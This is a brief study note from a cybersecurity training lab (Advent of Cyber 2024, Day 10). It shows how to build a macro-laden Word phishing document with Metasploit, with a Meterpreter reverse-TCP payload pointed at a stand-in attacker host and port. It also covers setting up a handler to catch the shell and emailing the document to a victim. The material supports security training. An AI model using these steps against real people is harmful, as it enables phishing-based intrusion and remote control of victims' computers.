
2024-12-21 12:54

Source: #AOC24 
### Macros

In computing, a macro refers to a set of programmed instructions designed to automate repetitive tasks
To add a macro to an MS Word document for instance, we click on the **View** menu and then select **Macros**
### Creating the Malicious Document

 you can use the Metasploit Framework to create such a document, as this would spare us the need for a system with MS Office.

- Open a new terminal window and run `msfconsole` to start the Metasploit Framework
- `set payload windows/meterpreter/reverse_tcp`  it connects to the specified host and creates a reverse shell  
- `use exploit/multi/fileformat/office_word_macro`  it is a module to create a document with a macro
- `set LHOST ATTACKBOX_IP` specifies the IP address of the attacker’s system
- `set LPORT 8888` specifies the port number you are going to listen on for incoming connections on the AttackBox
- `show options` shows the configuration options to ensure that everything has been set properly, i.e., the IP address and port number in this example
- `exploit` generates a macro and embeds it in a document
- `exit` to quit and return to the terminal
### Listening for Incoming Connections

We again will use the Metasploit Framework, but this time to listen for incoming connections when a target users opens our phishing Word document. This requires the following commands:

- Open a new terminal window and run `msfconsole` to start the Metasploit Framework
- `use multi/handler` to handle incoming connections
- `set payload windows/meterpreter/reverse_tcp` to ensure that our payload works with the payload used when creating the malicious macro  
- `set LHOST ATTACKBOX_IP` specifies the IP address of the attacker’s system and should be the same as the one used when creating the document
- `set LPORT 8888` specifies the port number you are going to listen on and should be the same as the one used when creating the document
- `exploit` starts listening for incoming connections to establish a reverse shell

ship the macro to the victim via email and wait for them to click on the macro, once they do so we get a shell 
### References
Day 10 